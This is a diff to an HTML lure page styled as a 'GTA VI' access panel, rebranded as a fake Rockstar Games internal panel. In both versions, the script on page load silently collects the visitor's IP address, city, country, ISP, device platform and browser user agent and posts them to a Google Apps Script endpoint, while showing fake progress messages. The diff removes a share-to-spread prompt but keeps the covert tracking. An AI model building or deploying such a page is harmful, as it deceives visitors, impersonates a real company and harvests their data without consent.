@@ -3,73 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GTA VI SECURE ACCESS</title>
+<title>Rockstar Internal Access Panel</title>
 
 <style>
 body {
   margin: 0;
-  background: #000;
+  background: #0b0b0b;
   color: #00ff9f;
   font-family: monospace;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  height: 100vh;
 }
 
 .container {
-  width: 90%;
-  max-width: 500px;
-  border: 2px solid #00ff9f;
+  max-width: 600px;
+  margin: 50px auto;
+  border: 1px solid #00ff9f;
   padding: 20px;
+  background: #000;
+  box-shadow: 0 0 20px rgba(0,255,159,0.2);
 }
 
 h1 {
-  color: #ff0033;
   text-align: center;
-  animation: glitch 1s infinite;
+  color: #ffcc00;
 }
 
-@keyframes glitch {
-  0% {opacity: 1;}
-  50% {opacity: 0.7;}
-  100% {opacity: 1;}
+.status {
+  margin-top: 10px;
+  font-size: 13px;
+  color: #ccc;
 }
 
 .terminal {
-  font-size: 12px;
-  height: 150px;
-  overflow-y: auto;
+  margin-top: 15px;
   background: #000;
-  margin-top: 10px;
+  padding: 10px;
+  height: 180px;
+  overflow-y: auto;
+  border: 1px solid #00ff9f;
+  font-size: 12px;
 }
 
 .progress {
-  width: 100%;
-  height: 15px;
-  background: #222;
   margin-top: 10px;
+  height: 10px;
+  background: #222;
 }
 
 .bar {
-  width: 0%;
   height: 100%;
+  width: 0%;
   background: #00ff9f;
 }
 
 button {
   width: 100%;
   padding: 10px;
-  margin-top: 10px;
-  background: #ff0033;
-  color: white;
+  margin-top: 15px;
+  background: #00ff9f;
+  color: black;
   border: none;
   font-weight: bold;
+  cursor: pointer;
 }
 
-.info {
-  font-size: 12px;
+.footer {
   margin-top: 10px;
+  font-size: 11px;
+  text-align: center;
+  color: #666;
 }
 </style>
 </head>
@@ -77,9 +78,9 @@ button {
 <body>
 
 <div class="container">
-  <h1>SECURITY BREACH</h1>
+  <h1>INTERNAL ACCESS PANEL</h1>
 
-  <div class="info" id="info">Fetching system identity...</div>
+  <div class="status" id="status">Initializing system...</div>
 
   <div class="terminal" id="terminal"></div>
 
@@ -87,14 +88,19 @@ button {
     <div class="bar" id="bar"></div>
   </div>
 
-  <button onclick="startHack()">AUTHENTICATE UPLINK</button>
+  <button onclick="startSystem()">RUN SYSTEM CHECK</button>
+
+  <div class="footer">
+    Rockstar Games Internal Network • Authorized Use Only
+  </div>
 </div>
 
 <script>
 
-// ===== FETCH USER DATA =====
+// ===== USER DATA =====
 let userData = {};
 
+// ===== FETCH USER INFO =====
 async function getUserData() {
   try {
     let res = await fetch("https://ipapi.co/json/");
@@ -104,48 +110,52 @@ async function getUserData() {
       ip: data.ip,
       city: data.city,
       country: data.country_name,
-      isp: data.org,
+      org: data.org,
       device: navigator.platform,
-      browser: navigator.userAgent
+      browser: navigator.userAgent,
+      time: new Date().toLocaleString()
     };
 
-    document.getElementById("info").innerText =
-      `IP: ${data.ip} | ${data.city}, ${data.country_name}`;
+    document.getElementById("status").innerText =
+      `Connected: ${data.ip} (${data.city}, ${data.country_name})`;
 
-    trackUser(); // send to sheet
+    trackUser();
 
-  } catch {}
+  } catch (e) {
+    document.getElementById("status").innerText = "Connection limited";
+  }
 }
 
-// ===== TRACK USER (GOOGLE SHEETS) =====
+// ===== TRACK USER (GOOGLE SHEET) =====
 async function trackUser() {
   try {
     await fetch("https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec", {
       method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(userData)
     });
-  } catch {}
+  } catch (e) {
+    console.log("Tracking failed");
+  }
 }
 
-// ===== TERMINAL LOG =====
+// ===== TERMINAL =====
 function log(text) {
   let terminal = document.getElementById("terminal");
   terminal.innerHTML += text + "<br>";
   terminal.scrollTop = terminal.scrollHeight;
 }
 
-// ===== MAIN SEQUENCE =====
-function startHack() {
+// ===== SYSTEM FLOW =====
+function startSystem() {
+
   let logs = [
-    "Connecting to Rockstar servers...",
-    "Bypassing firewall...",
-    "Decrypting GTA VI assets...",
-    "Tracking IP: " + userData.ip,
-    "Accessing device: " + userData.device,
-    "Scanning files...",
-    "Photos detected: 124",
-    "Contacts synced: 58",
-    "Injecting access token..."
+    "Connecting to internal network...",
+    "Verifying credentials...",
+    "Loading GTA VI assets...",
+    "Checking device compatibility...",
+    "Syncing logs...",
+    "Finalizing session..."
   ];
 
   let i = 0;
@@ -154,41 +164,18 @@ function startHack() {
   let interval = setInterval(() => {
     if (i < logs.length) {
       log(logs[i]);
+      bar.style.width = ((i + 1) / logs.length) * 100 + "%";
       i++;
-      bar.style.width = (i / logs.length) * 100 + "%";
     } else {
       clearInterval(interval);
-      triggerShare();
+      complete();
     }
-  }, 1000);
+  }, 800);
 }
 
-// ===== SHARE TRIGGER =====
-function triggerShare() {
-  setTimeout(() => {
-    alert("⚠ Unauthorized Access\nShare link to gain admin clearance");
-
-    if (navigator.share) {
-      navigator.share({
-        title: "GTA VI Access",
-        text: "Restricted GTA VI server access 😳",
-        url: window.location.href
-      });
-    }
-
-    redirect();
-  }, 2000);
-}
-
-// ===== REDIRECT =====
-function redirect() {
-  setTimeout(() => {
-    document.body.style.background = "white";
-    setTimeout(() => {
-      document.body.style.background = "black";
-      window.location.href = "https://www.rockstargames.com/VI";
-    }, 300);
-  }, 1000);
+// ===== COMPLETE =====
+function complete() {
+  log("Access granted ✔");
 }
 
 // INIT
